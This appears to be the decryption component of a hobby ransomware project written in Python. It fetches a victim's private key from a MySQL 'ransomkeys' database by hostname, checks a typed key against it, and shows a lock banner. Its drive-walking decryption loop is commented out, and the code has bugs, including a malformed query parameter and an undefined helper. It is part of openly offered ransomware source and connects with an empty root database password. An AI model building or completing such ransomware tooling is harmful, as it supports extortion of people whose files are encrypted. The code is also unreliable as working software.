
import os
import sys

# adding Folder_2 to the system path
sys.path.insert(0, 'C:\\Users\\SupeRj\\Desktop\\crypto project\\crypto_project')

import win32api
from datetime import datetime
import mysql.connector
from __init__ import decrypt_file
from key import newkeys, PrivateKey

def decyptionalgorithme(key):
    key = key.split(",")
    finalkey = PrivateKey(int(key[0]), int(key[1]), int(key[2]), int(key[3]), int(key[4]))    
    
    # drives = win32api.GetLogicalDriveStrings()
    # drives = drives.split('')[:-1]
    
    #for drive in drives:
    #    for dirpath, dirnames, filenames in os.walk(drive):
    #        for filename in filenames:
    #            if protect_Code_Files(filename) == False:
    #                file = os.path.join(dirpath, filename)
    #                try:  # 5- encrypting_files
    #                    decrypt_file(file, finalkey) 
    #                except:
    #                    print("can't decrypt the file : " + str(file))               

def decrypt():
    hostname = []
    hostname.append(os.getenv('COMPUTERNAME'))
    cnx = mysql.connector.connect(user='root', password='',
                            host='192.168.1.6', database='ransomkey')
    cursor = cnx.cursor()
    query = "SELECT private_key FROM ransomkeys where hostname=%s"
    params = (hostname)
    
    cursor.execute(query, params)
    results = cursor.fetchall()
    
    key = str(input("Enter the key"))
    for result in results:
        if key == result[0]:
            decyptionalgorithme(key)
        else:
            print("wrong key")

lock = '''\033[1;32m
                                                                             .--------.
                                                                            / .------. \\
                                                                           / /        \ \\
                                                                           | |        | |
                                                                          _| |________| |_
                                                                        .' |_|        |_| '.
                                                                        '._____ ____ _____.'
                                                                        |     .'____'.     |
                                                                        '.__.'.'    '.'.__.'
                                                                        '.__  |      |  __.'
                                                                        |   '.'.____.'.'   |
                                                                        '.____'.____.'____.'
                                                                        '.________________.'

)\.---.   )\  )\  .-,.-.,-.  )\.---.     /`-.           .'(   )\.---.  )\    /(      .-,.-.,-.    .-./(          )\.-.   )\.---.     )\.-.     /`-.  )\    /(    /`-.  .-,.-.,-. 
(   ,-._( (  \, /  ) ,, ,. ( (   ,-._(  ,' _  \       ,')\  ) (   ,-._( \ (_.' /      ) ,, ,. (  ,'     )       ,'     ) (   ,-._(  ,' ,-,_)  ,' _  \ \ (_.' /  ,' _  \ ) ,, ,. ( 
\  '-,    ) \ (   \( |(  )/  \  '-,   (  '-' (      (  '/ /   \  '-,    )  _.'       \( |(  )/ (  .-, (       (  .-, (   \  '-,   (  .   _  (  '-' (  )  _.'  (  '-' ( \( |(  )/ 
) ,-`   ( ( \ \     ) \      ) ,-`    ) ,_ .'       )   (     ) ,-`    / /             ) \     ) '._\ )       ) '._\ )   ) ,-`    ) '..' )  ) ,_ .'  / /      ) ,._.'    ) \    
(  ``-.   `.)/  )    \ (     (  ``-.  (  ' ) \      (  .\ \   (  ``-.  (  \             \ (    (  ,   (       (  ,   (   (  ``-.  (  ,   (  (  ' ) \ (  \     (  '        \ (    
)..-.(      '.(      )/      )..-.(   )/   )/       )/  )/    )..-.(   ).'              )/     )/ ._.'        )/ ._.'    )..-.(   )/'._.'   )/   )/  ).'      )/          )/    
'''
print (lock)
key= input()
decrypt()

    